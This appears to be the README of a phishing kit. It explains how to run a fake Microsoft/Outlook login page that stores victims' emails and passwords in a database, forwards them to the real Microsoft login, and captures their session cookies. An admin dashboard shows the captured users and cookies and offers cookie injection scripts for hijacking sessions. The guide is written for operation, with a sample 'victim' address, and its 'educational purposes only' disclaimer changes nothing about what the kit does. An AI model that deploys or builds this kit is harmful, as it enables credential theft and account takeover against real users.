# Setup Guide

## How It Works

1. **User visits your login page** (`/login`)
2. **User enters email** → clicks Next
3. **User enters password** → clicks Sign in
4. **Credentials saved to database**
5. **User redirected to REAL Microsoft login**
6. **User authenticates with Microsoft**
7. **Microsoft redirects back to your callback**
8. **Browser cookies automatically captured**
9. **Cookies saved to database with user's email**
10. **User redirected to Outlook**

## Quick Setup

### 1. Install Dependencies
```bash
npm install
```

### 2. Create `.env` file
```bash
cp .env.example .env
```

### 3. Register Microsoft App

Go to [Azure Portal](https://portal.azure.com) → App Registrations → New Registration

**Settings:**
- Name: `Outlook Proxy App`
- Redirect URI: `http://localhost:8000/user/callback`
- Permissions: `Mail.ReadWrite` (Microsoft Graph)

Copy the **Client ID** and **Client Secret** to your `.env` file.

### 4. Setup MongoDB

Option A: Use MongoDB Atlas (cloud)
- Create free cluster at [mongodb.com](https://www.mongodb.com/cloud/atlas)
- Get connection string
- Add to `.env` as `MONGODB_URI`

Option B: Use local MongoDB
- Install MongoDB locally
- Use: `MONGODB_URI=mongodb://localhost:27017/outlook-proxy`

### 5. Start Server
```bash
npm start
```

Visit: `http://localhost:8000/login`

## Testing the Flow

1. Open `http://localhost:8000/login`
2. Enter any email (e.g., `victim@outlook.com`)
3. Enter any password (this is just captured, not validated)
4. You'll be redirected to REAL Microsoft login
5. Login with REAL Microsoft credentials
6. Cookies will be captured automatically
7. Check admin dashboard at `/admin` to see captured cookies

## Admin Dashboard

Access: `http://localhost:8000/admin`

Features:
- View all captured users
- See their cookies
- Cookie injection scripts
- User management

## Important Notes

⚠️ **Educational purposes only**
⚠️ Never use hardcoded credentials in production
⚠️ The fake login page captures credentials but doesn't validate them
⚠️ Real authentication happens at Microsoft's servers
⚠️ Browser cookies are captured after successful Microsoft authentication
